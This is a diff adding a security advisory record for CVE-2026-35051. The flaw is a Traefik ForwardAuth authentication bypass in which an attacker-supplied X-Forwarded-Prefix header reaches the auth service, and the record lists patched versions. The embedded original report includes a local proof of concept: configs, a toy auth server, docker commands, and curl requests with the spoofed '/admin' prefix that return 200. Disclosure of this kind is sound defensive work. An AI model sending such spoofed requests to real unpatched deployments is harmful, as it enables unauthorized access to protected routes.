@@ -1,0 +1,126 @@
+{
+  "id": "GHSA-6384-m2mw-rf54",
+  "modified": "2026-05-05T16:01:55.600178Z",
+  "published": "2026-04-24T16:31:24Z",
+  "aliases": [
+    "CVE-2026-35051"
+  ],
+  "summary": "Traefik's ForwardAuth trustForwardHeader=false allows spoofed X-Forwarded-Prefix to bypass authentication",
+  "details": "## Summary\n\nThere is a high-severity authentication bypass vulnerability in Traefik's `ForwardAuth` middleware when `trustForwardHeader=false` is configured and Traefik is deployed behind a trusted upstream proxy.\n\nWhile `X-Forwarded-*` headers (such as `X-Forwarded-For`, `X-Forwarded-Host`, and `X-Forwarded-Proto`) from trusted context are correctly rebuilt, it does not strip or rebuild `X-Forwarded-Prefix`, leaving any attacker-supplied value intact in the subrequest forwarded to the authentication service.\n\nWhen the authentication service makes authorization decisions based on `X-Forwarded-Prefix`, an external attacker can spoof a trusted prefix value and gain unauthorized access to protected backend routes.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.43\n- https://github.com/traefik/traefik/releases/tag/v3.6.14\n- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.2\n\n## For more information\n\nIf there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\n\n### Summary\n`ForwardAuth` with `trustForwardHeader=false` still forwards an attacker-controlled `X-Forwarded-Prefix` header to the authentication service when Traefik is deployed behind a trusted upstream proxy. If the auth service relies on `X-Forwarded-Prefix` for authorization or routing decisions, an external attacker can bypass access controls and reach protected backend routes.\n\nThis was validated this against Traefik `v3.6.12` using the official Docker image and a minimal local Docker setup. A direct request to Traefik is correctly rejected, but the same request succeeds when sent through a trusted reverse proxy, which shows the issue is in the `ForwardAuth` subrequest handling rather than general ingress header stripping.\n\n### Details\nThe vulnerable behavior comes from the way Traefik builds the subrequest sent to the forward-auth server.\n\nIn [`pkg/middlewares/auth/forward.go`](pkg/middlewares/auth/forward.go), `writeHeader` first copies all incoming request headers into the auth subrequest:\n\n```go\nfunc writeHeader(req, forwardReq *http.Request, trustForwardHeader bool, allowedHeaders []string) {\n    utils.CopyHeaders(forwardReq.Header, req.Header)\n    ...\n    forwardReq.Header = filterForwardRequestHeaders(forwardReq.Header, allowedHeaders)\n```\n\nIt then selectively rebuilds only a subset of forwarded headers when `trustForwardHeader=false`, for example:\n\n- `X-Forwarded-For`\n- `X-Forwarded-Method`\n- `X-Forwarded-Proto`\n- `X-Forwarded-Port`\n- `X-Forwarded-Host`\n- `X-Forwarded-Uri`\n\nHowever, it does **not** remove or rebuild `X-Forwarded-Prefix`, so an attacker-supplied value remains in the auth request even when forwarded headers are supposed to be untrusted.\n\nThis becomes security-relevant when `StripPrefix` is used before `ForwardAuth`. In [`pkg/middlewares/stripprefix/strip_prefix.go`](pkg/middlewares/stripprefix/strip_prefix.go), Traefik appends the stripped prefix using `Header.Add`:\n\n```go\nfunc (s *stripPrefix) serveRequest(rw http.ResponseWriter, req *http.Request, prefix string) {\n    req.Header.Add(ForwardedPrefixHeader, prefix)\n```\n\nIf the attacker already sent `X-Forwarded-Prefix: /admin`, and `StripPrefix` later adds `/forbidden`, the auth service receives both values in this order:\n\n1. `/admin` (attacker-controlled)\n2. `/forbidden` (Traefik-generated)\n\nAn auth service that uses the first `X-Forwarded-Prefix` value can therefore be tricked into authorizing a protected route.\n\nWhy this appears unintended:\n\n- The docs say `trustForwardHeader` means \"Trust all X-Forwarded-* headers\" and defaults to `false`.\n- The migration notes say `X-Forwarded-Prefix` is handled like other `X-Forwarded-*` headers and removed from untrusted sources.\n- The direct-to-Traefik test case behaves consistently with that expectation and returns `403`.\n- Only the auth subrequest path still honors the spoofed `X-Forwarded-Prefix`.\n\nRelevant source/documentation locations:\n\n- `pkg/middlewares/auth/forward.go` lines 393-459\n- `pkg/middlewares/stripprefix/strip_prefix.go` lines 65-68\n- `pkg/middlewares/forwardedheaders/forwarded_header.go` lines 15-43\n- `docs/content/reference/routing-configuration/http/middlewares/forwardauth.md` lines 59-62 and 130-140\n- `docs/content/migrate/v3.md` lines 192-196\n\nThis was only tested and validated with `X-Forwarded-Prefix`. By source review, other forwarded headers that are copied but not rebuilt in `writeHeader` may deserve separate review, but I am not claiming impact for them here.\n\n### PoC\nThe following uses the official `traefik:v3.6.12` Docker image and a mounted `traefik.toml`, matching the documented deployment style.\n\n1. Create `traefik.toml`:\n\n```toml\n[entryPoints]\n  [entryPoints.web]\n    address = \":80\"\n    [entryPoints.web.forwardedHeaders]\n      trustedIPs = [\"172.31.79.0/24\"]\n\n[providers]\n  [providers.file]\n    filename = \"/etc/traefik/dynamic.toml\"\n    watch = false\n\n[log]\n  level = \"DEBUG\"\n\n[accessLog]\n```\n\n2. Create `dynamic.toml`:\n\n```toml\n[http.routers]\n  [http.routers.app]\n    entryPoints = [\"web\"]\n    rule = \"Host(`app.local`) \u0026\u0026 PathPrefix(`/forbidden`)\"\n    middlewares = [\"strip-forbidden\", \"authz\"]\n    service = \"backend\"\n\n[http.middlewares]\n  [http.middlewares.strip-forbidden.stripPrefix]\n    prefixes = [\"/forbidden\"]\n\n  [http.middlewares.authz.forwardAuth]\n    address = \"http://auth:8000/check\"\n    trustForwardHeader = false\n    authResponseHeaders = [\"X-Auth-First-Prefix\", \"X-Auth-All-Prefixes\"]\n\n[http.services]\n  [http.services.backend.loadBalancer]\n    [[http.services.backend.loadBalancer.servers]]\n      url = \"http://backend:80\"\n```\n\n3. Create `auth.py`:\n\n```python\nimport json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if not self.path.startswith(\"/check\"):\n            self.send_response(404)\n            self.end_headers()\n            return\n\n        prefixes = self.headers.get_all(\"X-Forwarded-Prefix\") or []\n        first = prefixes[0] if prefixes else \"\"\n        payload = {\n            \"path\": self.path,\n            \"first_prefix\": first,\n            \"all_prefixes\": prefixes,\n            \"x_forwarded_for\": self.headers.get_all(\"X-Forwarded-For\") or [],\n        }\n        print(json.dumps(payload), flush=True)\n\n        if first == \"/admin\":\n            self.send_response(200)\n            self.send_header(\"X-Auth-First-Prefix\", first)\n            self.send_header(\"X-Auth-All-Prefixes\", \"|\".join(prefixes))\n            self.end_headers()\n            self.wfile.write(b\"authorized\\n\")\n            return\n\n        self.send_response(403)\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(json.dumps(payload).encode() + b\"\\n\")\n\n\nHTTPServer((\"0.0.0.0\", 8000), Handler).serve_forever()\n```\n\n4. Create `frontend.conf`:\n\n```nginx\nserver {\n    listen 80;\n    access_log /dev/stdout;\n\n    location / {\n        proxy_http_version 1.1;\n        proxy_pass http://traefik:80;\n        proxy_set_header Host $http_host;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    }\n}\n```\n\n5. Start the containers:\n\n```bash\ndocker network create --subnet 172.31.79.0/24 traefik-readme-net\n\ndocker run -d --name traefik-readme-backend \\\n  --network traefik-readme-net \\\n  --network-alias backend \\\n  traefik/whoami\n\ndocker run -d --name traefik-readme-auth \\\n  --network traefik-readme-net \\\n  --network-alias auth \\\n  -v \"$PWD/auth.py:/app/auth.py:ro\" \\\n  -w /app \\\n  python:3.12-alpine \\\n  python /app/auth.py\n\ndocker run -d --name traefik-readme-traefik \\\n  --network traefik-readme-net \\\n  --network-alias traefik \\\n  -p 18081:80 \\\n  -v \"$PWD/traefik.toml:/etc/traefik/traefik.toml:ro\" \\\n  -v \"$PWD/dynamic.toml:/etc/traefik/dynamic.toml:ro\" \\\n  traefik:v3.6.12\n\ndocker run -d --name traefik-readme-frontend \\\n  --network traefik-readme-net \\\n  -p 18080:80 \\\n  -v \"$PWD/frontend.conf:/etc/nginx/conf.d/default.conf:ro\" \\\n  nginx:alpine\n```\n\n6. Send three requests:\n\nDirect to Traefik, spoofed header:\n```bash\ncurl -sS -i \\\n  -H 'Host: app.local' \\\n  -H 'X-Forwarded-Prefix: /admin' \\\n  http://127.0.0.1:18081/forbidden/test\n```\n\nExpected result:\n```http\nHTTP/1.1 403 Forbidden\n...\n{\"path\": \"/check\", \"first_prefix\": \"/forbidden\", \"all_prefixes\": [\"/forbidden\"]}\n```\n\nThrough trusted proxy, no spoofing:\n```bash\ncurl -sS -i \\\n  -H 'Host: app.local' \\\n  http://127.0.0.1:18080/forbidden/test\n```\n\nExpected result:\n```http\nHTTP/1.1 403 Forbidden\n...\n{\"path\": \"/check\", \"first_prefix\": \"/forbidden\", \"all_prefixes\": [\"/forbidden\"]}\n```\n\nThrough trusted proxy, spoofed header:\n```bash\ncurl -sS -i \\\n  -H 'Host: app.local' \\\n  -H 'X-Forwarded-Prefix: /admin' \\\n  http://127.0.0.1:18080/forbidden/test\n```\n\nObserved result:\n```http\nHTTP/1.1 200 OK\n...\nX-Auth-All-Prefixes: /admin|/forbidden\nX-Auth-First-Prefix: /admin\nX-Forwarded-Prefix: /admin\nX-Forwarded-Prefix: /forbidden\n```\n\nThe backend response confirms that the request reached the protected upstream after the auth service accepted the attacker-controlled prefix.\n\n7. Optional log confirmation from the auth service:\n\n```bash\ndocker logs traefik-readme-auth\n```\n\nObserved log sequence:\n```json\n{\"path\": \"/check\", \"first_prefix\": \"/forbidden\", \"all_prefixes\": [\"/forbidden\"], ...}\n{\"path\": \"/check\", \"first_prefix\": \"/forbidden\", \"all_prefixes\": [\"/forbidden\"], ...}\n{\"path\": \"/check\", \"first_prefix\": \"/admin\", \"all_prefixes\": [\"/admin\", \"/forbidden\"], ...}\n```\n\n8. Cleanup:\n\n```bash\ndocker rm -f traefik-readme-traefik traefik-readme-backend traefik-readme-auth traefik-readme-frontend\ndocker network rm traefik-readme-net\n```\n\n### Impact\nThis is an authentication bypass / trust-boundary bypass.\n\nAffected deployments are those that:\n\n- run Traefik behind a trusted upstream proxy\n- use `ForwardAuth`\n- rely on `trustForwardHeader=false` to avoid trusting client-supplied forwarded headers\n- pass `X-Forwarded-Prefix` to the auth service, which happens by default when `authRequestHeaders` is empty\n- make authorization or routing decisions based on `X-Forwarded-Prefix`, especially when `StripPrefix` runs before `ForwardAuth`\nIn those environments, an unauthenticated external attacker can influence the auth service's view of the protected path and gain access to backend routes that should be denied.\n\n\u003c/details\u003e\n\n----",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.7.0-ea.1"
+            },
+            {
+              "fixed": "3.7.0-rc.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-6384-m2mw-rf54/GHSA-6384-m2mw-rf54.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.0.0-beta1"
+            },
+            {
+              "fixed": "3.6.14"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-6384-m2mw-rf54/GHSA-6384-m2mw-rf54.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v2",
+        "purl": "pkg:golang/github.com/traefik/traefik/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.43"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-6384-m2mw-rf54/GHSA-6384-m2mw-rf54.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik",
+        "purl": "pkg:golang/github.com/traefik/traefik"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.7.34"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-6384-m2mw-rf54/GHSA-6384-m2mw-rf54.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-6384-m2mw-rf54"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/traefik/traefik"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v2.11.43"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.6.14"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.2"
+    }
+  ]
+}
